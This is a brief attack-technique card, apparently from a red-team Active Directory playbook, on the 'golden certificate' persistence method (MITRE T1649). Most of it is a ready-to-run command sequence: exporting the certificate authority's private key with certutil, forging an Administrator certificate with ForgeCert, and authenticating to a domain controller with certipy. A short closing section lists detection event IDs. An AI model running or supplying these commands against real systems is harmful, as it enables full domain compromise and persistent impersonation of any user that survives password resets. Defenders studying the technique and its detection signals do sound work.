---
id: golden_cert
type: technique
label: "Golden certificate (CA key theft)"
phase: "persist"
tools: ["forgecert", "certipy"]
cve: null
detect: "Certificate issuance that bypasses the normal CA request workflow."
mitre: "T1649"
tag: null
---


# Golden certificate (CA key theft)

### Affected object / attribute
**CA private key** (CA host compromise or backup).

### Concept (deep)
Forge certificates for any user → **PKINIT** → long-lived domain persistence (valid until the CA cert expires, independent of password resets).

### Commands
```bash
# ── Export CA key (on CA) ────────────────────────────────────────────
certutil -backupKey C:\backup

# ── Forge a certificate ─────────────────────────────────────────────
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword p \
  --Subject "CN=Administrator" \
  --SubjectAltName administrator@corp.local --NewCertPath admin.pfx

# ── Authenticate ─────────────────────────────────────────────────────
certipy auth -pfx admin.pfx -dc-ip 10.10.10.5
```

### Detection
**4886/4887** for certificates whose serial does not match CA issuance logs; CA key export audit.

---
